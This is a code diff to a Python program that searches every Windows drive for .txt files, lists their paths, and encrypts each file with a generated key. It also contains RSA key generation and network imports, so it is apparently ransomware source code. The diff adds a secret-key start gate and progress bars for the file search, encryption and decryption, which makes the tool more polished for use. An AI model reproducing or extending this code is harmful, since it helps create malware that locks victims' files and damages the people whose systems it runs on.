@@ -7,7 +7,29 @@ import base64
 import socket
 import requests
 import csv
+import sys
 
+def waitingForKey(key, message="Enter the secret key to start the program: "):
+    secret_key = key
+    while True:
+        user_input = input(message)
+        if user_input == secret_key:
+            print("Access granted! Starting the program...")
+            break
+        else:
+            print("Incorrect key. Try again.")
+
+def progress_bar(total, progress, length=40, label=''):
+    filled_length = int(length * progress // total)
+    bar = '#' * filled_length + '-' * (length - filled_length)
+    percent = (progress / total) * 100
+    sys.stdout.write('\r %s [%s] %.1f%%' % (label+'... :', bar, percent ))
+    sys.stdout.flush()
+
+def count_lines(file_path):
+    with open(file_path, 'r') as file:
+        line_count = sum(1 for line in file)
+    return line_count
 
 def generate_key(length):
     """Generate a random ASCII key of given length"""
@@ -34,6 +56,7 @@ def findRootDirsWindows():
 def findTxtFile(file_name):
     """Find all text files in the system and write their paths to a .txt file"""
     root_dirs = findRootDirsWindows()
+    txtFileCounter = 0
     for root_dir in root_dirs:
         for root, dirs, files in os.walk(root_dir):
             for file in files:
@@ -41,9 +64,14 @@ def findTxtFile(file_name):
                     if file == file_name:
                         continue
                     file_path = os.path.join(root, file)
+                    txtFileCounter += 1
+                    progress_bar(8996, txtFileCounter, 50, 'Finding .txt files')
+                    #print("Files Found: ", txtFileCounter, end='\r')
                     # Write file_path to a .txt file
                     with open(file_name, "a") as f:
                         f.write(file_path + "\n")
+    print("\n")
+    return txtFileCounter
 
 
 def pad_data(data):
@@ -96,16 +124,24 @@ def decrypt_file(key, file_path):
         print(f"Error decrypting {file_path}")
 
 def encrypt_file_paths(key, file_path):
+    pathsCount = count_lines(file_path)
+    counter = 0
     with open(file_path, "r") as f:
         for line in f:
             file_path = line.strip()
             encrypt_file(key, file_path)
+            counter += 1
+            progress_bar(pathsCount, counter, 50, 'Encrypting files')
 
 def decrypt_file_paths(key, file_path):
+    pathsCount = count_lines(file_path)
+    counter = 0
     with open(file_path, "r") as f:
         for line in f:
             file_path = line.strip()
             decrypt_file(key, file_path)
+            counter += 1
+            progress_bar(pathsCount, counter, 50, 'Decrypting files')
 
 def generateRSAKeys():
     """Generate an RSA key pair"""
